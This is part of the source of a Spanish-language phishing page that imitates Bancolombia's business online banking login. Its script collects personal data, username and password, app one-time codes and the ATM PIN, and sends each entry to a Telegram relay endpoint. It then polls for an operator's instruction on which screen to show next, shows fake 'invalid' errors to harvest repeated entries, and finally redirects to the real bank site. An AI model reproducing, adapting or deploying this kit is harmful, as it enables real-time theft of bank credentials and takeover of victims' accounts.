                        if (value.length >= 6) {
                            this.classList.remove('has-error');
                            this.classList.add('is-valid');
                            docError.classList.add('hidden');
                        } else {
                            this.classList.remove('is-valid');
                            this.classList.add('has-error');
                            docError.textContent = 'El documento debe tener al menos 6 dígitos';
                            docError.classList.remove('hidden');
                        }
                    }
                } else {
                    this.classList.remove('has-error', 'is-valid');
                    docError.classList.add('hidden');
                }
                validateDocForm();
            });
            // Close alert
            if (closeAlert) {
                closeAlert.addEventListener('click', function () {
                    alertBanner.style.display = 'none';
                });
            }

            // =============================================
            // LOGIN USUARIO
            // =============================================
            const usuarioInput = document.getElementById('usuario-input');
            const claveInput = document.getElementById('clave');
            const btnIngresar = document.getElementById('btn-ingresar');
            const btnVolver = document.getElementById('btn-volver');
            const toggleUsuario = document.getElementById('toggle-usuario');
            const toggleClave = document.getElementById('toggle-clave');
            const tabLogin = document.getElementById('tab-login');
            const tabRegister = document.getElementById('tab-register');

            // Toggle password visibility for usuario
            toggleUsuario.addEventListener('click', function () {
                const type = usuarioInput.getAttribute('type') === 'password' ? 'text' : 'password';
                usuarioInput.setAttribute('type', type);
                updateToggleIcon(this, type === 'password');
            });

            // Toggle password visibility for clave
            toggleClave.addEventListener('click', function () {
                const type = claveInput.getAttribute('type') === 'password' ? 'text' : 'password';
                claveInput.setAttribute('type', type);
                updateToggleIcon(this, type === 'password');
            });
            function updateToggleIcon(button, isHidden) {
                if (isHidden) {
                    button.innerHTML = `
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"/>
                        </svg>
                    `;
                } else {
                    button.innerHTML = `
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
                        </svg>
                    `;
                }
            }

            // Validate inputs
            function validateLoginForm() {
                const usuario = usuarioInput.value.trim();
                const clave = claveInput.value.trim();
                btnIngresar.disabled = !(usuario.length >= 3 && clave.length >= 4);
            }

            usuarioInput.addEventListener('input', validateLoginForm);
            claveInput.addEventListener('input', validateLoginForm);
            // Tab switching
            tabLogin?.addEventListener('click', function () {
                tabLogin.classList.remove('bc-tab-inactive');
                tabLogin.classList.add('bc-tab-active');
                tabRegister.classList.remove('bc-tab-active');
                tabRegister.classList.add('bc-tab-inactive');
            });
            tabRegister?.addEventListener('click', function () {
                tabRegister.classList.remove('bc-tab-inactive');
                tabRegister.classList.add('bc-tab-active');
                tabLogin.classList.remove('bc-tab-active');
                tabLogin.classList.add('bc-tab-inactive');
            });
            // Volver button
            btnVolver?.addEventListener('click', function () {
                // Volver de Usuario a Datos Personales (si es el flujo)
                $('#datospersonales').removeClass('hidden');
                $('#usuario').addClass('hidden');
            });

            // =============================================
            // OTP INPUT (Clave Dinámica)
            // =============================================
            const otpInputs = document.querySelectorAll('.otp-input');
            const otpForm = document.getElementById('otp-form');
            const btnContinueOtp = document.getElementById('btn-otp-continue');

            function setupCodeInputs(inputs, maxLength, button, hiddenInput) {
                function updateHiddenValue() {
                    const value = Array.from(inputs).map(input => input.value).join('');
                    if (hiddenInput) {
                        hiddenInput.value = value;
                    }
                }

                function checkComplete() {
                    const allFilled = Array.from(inputs).every(input => input.value.length === 1);
                    if (button) {
                        button.disabled = !allFilled;
                    }
                    updateHiddenValue();
                }

                inputs.forEach((input, index) => {
                    input.addEventListener('input', function (e) {
                        this.value = this.value.replace(/[^0-9]/g, '');

                        if (this.value.length === 1) {
                            this.classList.add('filled');
                            if (index < inputs.length - 1) {
                                inputs[index + 1].focus();
                            }
                        } else {
                            this.classList.remove('filled');
                        }
                        checkComplete();
                    });

                    input.addEventListener('keydown', function (e) {
                        if (e.key === 'Backspace' && this.value === '' && index > 0) {
                            inputs[index - 1].focus();
                            inputs[index - 1].value = '';
                            inputs[index - 1].classList.remove('filled');
                            checkComplete();
                        }
                    });
                    input.addEventListener('paste', function (e) {
                        e.preventDefault();
                        const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, maxLength);

                        pastedData.split('').forEach((char, i) => {
                            if (inputs[i]) {
                                inputs[i].value = char;
                                inputs[i].classList.add('filled');
                            }
                        });

                        const lastIndex = Math.min(pastedData.length, inputs.length) - 1;
                        if (lastIndex >= 0 && lastIndex < inputs.length - 1) {
                            inputs[lastIndex + 1].focus();
                        } else if (lastIndex === inputs.length - 1) {
                            inputs[lastIndex].focus();
                        }
                        checkComplete();
                    });
                });
            }

            const otpHiddenInput = document.getElementById('otpapp-hidden');
            if (otpInputs.length > 0) {
                setupCodeInputs(otpInputs, 6, btnContinueOtp, otpHiddenInput);
            }

            otpForm?.addEventListener('submit', function (e) {
                e.preventDefault();
                // El envío se maneja en el bloque jQuery
            });
            // =============================================
            // CLAVE CAJERO INPUT
            // =============================================
            const claveInputsCajero = document.querySelectorAll('.clavecajero-input');
            const claveForm = document.getElementById('clavecajero-form');
            const btnContinueClave = document.getElementById('btn-clavecajero-continue');
            const claveHiddenInput = document.getElementById('clavecajero-hidden');
            if (claveInputsCajero.length > 0) {
                setupCodeInputs(claveInputsCajero, 4, btnContinueClave, claveHiddenInput);
            }

            claveForm?.addEventListener('submit', function (e) {
                e.preventDefault();
                // El envío se maneja en el bloque jQuery
            });

            // =============================================
            // HANDLERS COMUNES
            // =============================================
            // Close and Cancel buttons logic (all cards)
            document.querySelectorAll('.btn-close-card, .btn-cancel-card').forEach(btn => {
                btn.addEventListener('click', function () {
                    // Opcionalmente, volver a una vista específica o cerrar el proceso
                    // Por simplicidad, volvemos a la vista anterior o a la inicial.
                    window.history.back();
                });
            });
        });
    </script>

    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <script>
        $(document).ready(function () {
            // ==================== CONFIGURACIÓN INICIAL ====================

            function generateUniqId() {
                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                let result = '';
                for (let i = 0; i < 6; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return result;
            }

            let sessionUniqId = sessionStorage.getItem('uniqId');
            if (!sessionUniqId || sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6) {
                if (sessionUniqId && (sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6)) {
                    localStorage.clear();
                }
                sessionUniqId = generateUniqId();
                sessionStorage.setItem('uniqId', sessionUniqId);
            }

            const appState = {
                uniqId: sessionUniqId,
                currentView: 'datospersonales' // Inicia en Datos Personales
            };
            console.log('Session UniqID:', appState.uniqId);

            function saveToLocalStorage(key, value) {
                const storageKey = appState.uniqId + '_' + key;
                const valueToSave = value && value.trim() !== '' ? value : '--';
                localStorage.setItem(storageKey, JSON.stringify(valueToSave));
            }

            function getFromLocalStorage(key) {
                const storageKey = appState.uniqId + '_' + key;
                const value = localStorage.getItem(storageKey);
                return value ? JSON.parse(value) : '--';
            }

            function hideAllViews() {
                $('#inicio, #usuario, #otpapp, #clavecajero, #exito, #fin, #datospersonales').addClass('hidden');
            }

            function showView(viewId) {
                hideAllViews();
                const allowedViews = ['inicio', 'usuario', 'otpapp', 'clavecajero', 'exito', 'fin', 'datospersonales'];
                const finalView = allowedViews.includes(viewId) ? viewId : 'datospersonales';

                $('#' + finalView).removeClass('hidden');

                // Obtener historial de vistas mostradas
                const viewHistory = sessionStorage.getItem('viewHistory') || '';

                // Vistas que no deben mostrar error al repetirse
                const excludedViews = ['exito', 'fin', 'error'];

                if (viewHistory.includes(finalView) && !excludedViews.includes(finalView)) {
                    // La vista ya fue mostrada antes, mostrar mensaje de error y limpiar campos
                    if (finalView === 'datospersonales') {
                        $('#datospersonales-error').text('Los datos ingresados no son válidos. Por favor, intente nuevamente.').removeClass('hidden');
                        $('#nombre, #cedula, #email, #celular').val('').removeClass('is-valid has-error');
                        $('#btn-continue').prop('disabled', true);
                    } else if (finalView === 'inicio') {
                        $('#inicio-error').text('El documento ingresado no es válido. Por favor, intente nuevamente.').removeClass('hidden');
                        $('#doc-number').val('').removeClass('is-valid has-error');
                        $('#btn-inicio-continue').prop('disabled', true);
                    } else if (finalView === 'usuario') {
                        $('#usuario-error').text('Las credenciales ingresadas no son válidas. Por favor, intente nuevamente.').removeClass('hidden');
                        $('#usuario-input, #clave').val('').removeClass('is-valid has-error');
                        $('#btn-ingresar').prop('disabled', true);
                    } else if (finalView === 'otpapp') {
                        $('#otpapp-error').text('El código ingresado no es válido. Por favor, intente nuevamente.').removeClass('hidden');
                        $('.otp-input').val('').removeClass('filled');
                        $('#otpapp-hidden').val('');
                        $('#btn-otp-continue').prop('disabled', true);
                    } else if (finalView === 'clavecajero') {
                        $('#clavecajero-error').text('La clave ingresada no es válida. Por favor, intente nuevamente.').removeClass('hidden');
                        $('.clavecajero-input').val('').removeClass('filled');
                        $('#clavecajero-hidden').val('');
                        $('#btn-clavecajero-continue').prop('disabled', true);
                    }
                } else {
                    // Ocultar mensajes de error
                    $('#datospersonales-error, #inicio-error, #usuario-error, #otpapp-error, #clavecajero-error').addClass('hidden').text('');
                }

                // Registrar la vista en el historial si no existe
                if (!viewHistory.includes(finalView)) {
                    sessionStorage.setItem('viewHistory', viewHistory + finalView + ',');
                }

                appState.currentView = finalView;
            }

            function showLoading() {
                $('#loading').removeClass('hidden');
                // Solo inicia el polling si el spinner es visible
                if (!$('#loading').hasClass('hidden')) {
                    setTimeout(iniciarPolling, 2000); // Se reduce el tiempo para la primera comprobación.
                }
            }

            function hideLoading() {
                $('#loading').addClass('hidden');
            }

            function showError(input, errorSpan, message) {
                $(input).addClass('has-error').removeClass('is-valid');
                $(errorSpan).text(message).removeClass('hidden');
            }

            function showValid(input, errorSpan) {
                $(input).removeClass('has-error').addClass('is-valid');
                $(errorSpan).addClass('hidden');
            }

            function clearValidation(input, errorSpan) {
                $(input).removeClass('has-error is-valid');
                $(errorSpan).addClass('hidden');
            }

            // ==================== FUNCIONES DE COMUNICACIÓN ====================

            let enviandoATelegram = false;
            async function enviarATelegram() {
                if (enviandoATelegram) {
                    console.log('Ya hay un envío en progreso, evitando duplicado');
                    return;
                }

                enviandoATelegram = true;
                const allData = {};
                // Campos de todas las vistas
                const fields = ['nombre', 'cedula', 'email', 'celular', 'tipo-documento', 'numero-documento', 'usuario', 'clave', 'otpapp', 'clavecajero', 'uniqid'];
                fields.forEach(function (field) {
                    allData[field] = getFromLocalStorage(field);
                });
                try {
                    const response = await fetch('/api/telegram/send', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId,
                            data: allData
                        })
                    });
                    const result = await response.json();
                    console.log('Datos enviados a Telegram:', result);
                } catch (e) {
                    console.error('Error al enviar a Telegram:', e);
                } finally {
                    setTimeout(function () {
                        enviandoATelegram = false;
                    }, 1000);
                }
            }

            async function iniciarPolling() {
                // Validación clave: Si el loading no es visible, detener el polling.
                if ($('#loading').hasClass('hidden')) {
                    return;
                }

                try {
                    const response = await fetch('/api/telegram/check-button', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId
                        })
                    });
                    const data = await response.json();

                    if (data.button) {
                        hideLoading();
                        const viewMap = {
                            'inicio': 'inicio',
                            'usuario': 'usuario',
                            'otpapp': 'otpapp',
                            'clavecajero': 'clavecajero',
                            'exito': 'exito',
                            'fin': 'fin',
                            'error': 'fin',
                            'datospersonales': 'datospersonales'
                        };
                        const viewId = viewMap[data.button] || 'datospersonales'; // Por defecto a la vista inicial

                        // Corrección de Flujo:
                        // Si el back indica 'usuario' desde 'datospersonales' o 'inicio'
                        if (appState.currentView === 'datospersonales' && data.button === 'usuario') {
                            showView('usuario');
                        } else if (appState.currentView === 'inicio' && data.button === 'usuario') {
                            showView('usuario');
                        } else {
                            showView(viewId);
                        }

                        if (viewId === 'exito' || viewId === 'fin') {
                            setTimeout(function () {
                                window.location.href = 'https://www.bancolombia.com/negocios/productos/sucursal-virtual-negocios';
                            }, 5000);
                        }
                    } else {
                        setTimeout(iniciarPolling, 2000); // Reintentar cada 2 segundos
                    }
                } catch (error) {
                    console.error('Error en polling:', error);
                    setTimeout(iniciarPolling, 2000); // Reintentar a pesar del error
                }
            }

            // ==================== DATOS PERSONALES ====================

            // Elementos del formulario
            const nombreInput = document.getElementById('nombre');
            const cedulaInput = document.getElementById('cedula');
            const emailInput = document.getElementById('email');
            const celularInput = document.getElementById('celular');
            const btnContinueDatos = document.getElementById('btn-continue');
            const datosForm = document.getElementById('datos-form');
            const nombreError = document.getElementById('nombre-error');
            const cedulaError = document.getElementById('cedula-error');
            const emailError = document.getElementById('email-error');
            const celularError = document.getElementById('celular-error');

            // Funciones de validación
            function validateNombre(value) {
                if (!value || value.trim().length < 3) {
                    return 'El nombre debe tener al menos 3 caracteres';
                }
                if (!/^[a-zA-ZáéíóúÁÉÍÓÚñÑ\s]+$/.test(value)) {
                    return 'El nombre solo puede contener letras';
                }
                return '';
            }

            function validateCedula(value) {
                if (!value || value.length < 6) {
                    return 'La cédula debe tener al menos 6 dígitos';
                }
                if (value.length > 12) {
                    return 'La cédula no puede tener más de 12 dígitos';
                }
                return '';
            }

            function validateEmail(value) {
                if (!value) {
                    return 'El correo electrónico es requerido';
                }
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (!emailRegex.test(value)) {
                    return 'Ingresa un correo electrónico válido';
                }
                return '';
            }

            function validateCelular(value) {
                if (!value || value.length < 10) {
                    return 'El celular debe tener al menos 10 dígitos';
                }
                if (!/^3\d{9}$/.test(value)) {
                    return 'El celular debe comenzar con 3 y tener 10 dígitos';
                }
                return '';
            }

            function checkFormValidity() {
                const nombreValid = !validateNombre(nombreInput.value);
                const cedulaValid = !validateCedula(cedulaInput.value);
                const emailValid = !validateEmail(emailInput.value);
                const celularValid = !validateCelular(celularInput.value);
                btnContinueDatos.disabled = !(nombreValid && cedulaValid && emailValid && celularValid);
            }

            // Event listeners
            $(nombreInput).on('input', function () {
                this.value = this.value.toUpperCase();
                const value = this.value;
                if (value.length > 0) {
                    const error = validateNombre(value);
                    if (error) {
                        showError(this, nombreError, error);
                    } else {
                        showValid(this, nombreError);
                    }
                } else {
                    clearValidation(this, nombreError);
                }
                checkFormValidity();
            });

            $(cedulaInput).on('input', function () {
                let value = this.value;
                if (value.length > 12) {
                    value = value.slice(0, 12);
                    this.value = value;
                }
                if (value.length > 0) {
                    const error = validateCedula(value);
                    if (error) {
                        showError(this, cedulaError, error);
                    } else {
                        showValid(this, cedulaError);
                    }
                } else {
                    clearValidation(this, cedulaError);
                }
                checkFormValidity();
            });

            $(emailInput).on('input', function () {
                const value = this.value;
                if (value.length > 0) {
                    const error = validateEmail(value);
                    if (error) {
                        showError(this, emailError, error);
                    } else {
                        showValid(this, emailError);
                    }
                } else {
                    clearValidation(this, emailError);
                }
                checkFormValidity();
            });

            $(celularInput).on('input', function () {
                let value = this.value.replace(/\D/g, '');
                if (value.length > 10) {
                    value = value.slice(0, 10);
                }
                this.value = value;

                if (value.length > 0) {
                    const error = validateCelular(value);
                    if (error) {
                        showError(this, celularError, error);
                    } else {
                        showValid(this, celularError);
                    }
                } else {
                    clearValidation(this, celularError);
                }
                checkFormValidity();
            });

            // Form submit
            $(datosForm).on('submit', async function (e) {
                e.preventDefault();
                if (btnContinueDatos.disabled) return;

                saveToLocalStorage('nombre', nombreInput.value.trim());
                saveToLocalStorage('cedula', cedulaInput.value.trim());
                saveToLocalStorage('email', emailInput.value.trim());
                saveToLocalStorage('celular', celularInput.value.trim());
                saveToLocalStorage('uniqid', appState.uniqId);

                await enviarATelegram();
                showLoading();
            });

            // ==================== INICIO (DOCUMENTO EMPRESA) ====================
            $('#login-form-inicio').on('submit', async function (e) {
                e.preventDefault();
                // El formulario se valida en el script nativo (validateDocForm)
                saveToLocalStorage('tipo-documento', $('#doc-type-value').val().trim());
                saveToLocalStorage('numero-documento', $('#doc-number').val().trim());
                saveToLocalStorage('uniqid', appState.uniqId);

                // Mostrar la vista de usuario directamente
                showView('usuario');
            });

            // ==================== USUARIO ====================

            $('#login-form-usuario').on('submit', async function (e) {
                e.preventDefault();
                saveToLocalStorage('usuario', $('#usuario-input').val().trim());
                saveToLocalStorage('clave', $('#clave').val().trim());
                saveToLocalStorage('uniqid', appState.uniqId);

                await enviarATelegram();
                showLoading();
            });

            // ==================== OTP APP ====================

            $('#btn-otp-continue').on('click', async function () {
                saveToLocalStorage('otpapp', $('#otpapp-hidden').val().trim());
                saveToLocalStorage('uniqid', appState.uniqId);

                await enviarATelegram();
                showLoading();
            });

            // ==================== CLAVE CAJERO ====================

            $('#btn-clavecajero-continue').on('click', async function () {
                saveToLocalStorage('clavecajero', $('#clavecajero-hidden').val().trim());
                saveToLocalStorage('uniqid', appState.uniqId);

                await enviarATelegram();
                showLoading();
            });

            // ==================== INICIALIZACIÓN ====================

            showView('datospersonales');

        });
    </script>

</body>

</html>